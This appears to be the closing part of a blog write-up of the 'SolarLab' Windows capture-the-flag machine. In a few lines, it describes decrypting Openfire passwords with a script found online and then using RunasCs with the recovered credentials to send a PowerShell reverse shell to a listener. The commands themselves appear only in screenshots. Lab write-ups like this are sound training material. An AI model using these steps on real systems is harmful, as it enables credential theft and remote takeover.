<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_31.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_32.png" alt="Untitled" /></p>

<p>We search on internet a script able to decrypt openfire passwords, and we got the password!!</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_33.png" alt="Untitled" /></p>

<p>Using those credentials we can execute commands with those privileges we will use RunasCs to run powershell on the listener port</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_34.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_35.png" alt="Untitled" /></p>

<p>Machine pwned!!
<script src="/assets/js/matrix-overlay.js"></script></p>

</div>


<div class="comments">
<div id="disqus_thread"></div>
<script>
 var disqus_config = function () {
     this.page.url = 'https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html';
     this.page.identifier = '/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e';
     this.page.title = 'SolarLab-Windows-Medium';
 };

 (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
     var d = document, s = d.createElement('script');

     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';

     s.setAttribute('data-timestamp', +new Date());
     (d.head || d.body).appendChild(s);
 })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/writeups/2025/07/22/d0bd1f30-699b-4cb4-8096-51966443e47d-export-f2fed7e5-8f3c-486d-8c98-5912154c70d9.html">
            Scepter-Windows-Hard
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/07/20/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f.html">
            Haze-Windows-Hard
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
            Dog-Linux-Easy
          </a>
        </h3>
      </li>
    
  </ul>
</div>






<script>
  let i = 0;
  const text = '';
  const speed = parseInt('50');
  
  function typeWriter() {
    if (i < text.length) {
      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }

  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
